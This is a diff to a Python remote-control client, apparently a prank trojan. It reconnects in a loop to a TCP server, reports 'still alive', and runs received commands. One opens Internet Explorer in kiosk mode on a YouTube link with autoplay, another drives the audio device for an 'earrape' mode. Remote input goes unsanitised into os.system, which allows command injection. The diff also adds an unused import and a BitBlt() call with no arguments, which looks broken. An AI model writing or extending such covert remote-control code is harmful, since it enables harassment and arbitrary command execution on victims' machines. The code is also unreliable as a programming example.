@@ -5,9 +5,15 @@ import os
 import pickle
 import time
 from subprocess import call
-from ctypes import cast, POINTER
+import cython
+if os.name == "nt":
+    import ctypes
+    BitBlt = ctypes.windll.gdi32.BitBlt
 
 
+
+
+BitBlt()
 TCP_IP = '127.0.0.1'
 TCP_PORT = 80
 BUFFER_SIZE = 1024  # Normally 1024, but we want fast response
@@ -29,7 +35,7 @@ while 1:
         s.close()
         connected = False
         while connected == False:
-            time.sleep(1)
+            time.sleep(20)
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -99,7 +105,7 @@ while 1:
         s.send("still alive".encode())
     elif data[0] == "youtube":
         if len(data) == 2:
-            os.system("start iexplore -k " + ytlink1 + data[1])
+            os.system("start iexplore -k " + ytlink1 + data[1] + "&autoplay=1")
         elif len(data) > 3:
             if data[2] == "--earrape":
                 mmde = CoCreateInstance(CLSID_MMDeviceEnumerator, None, 
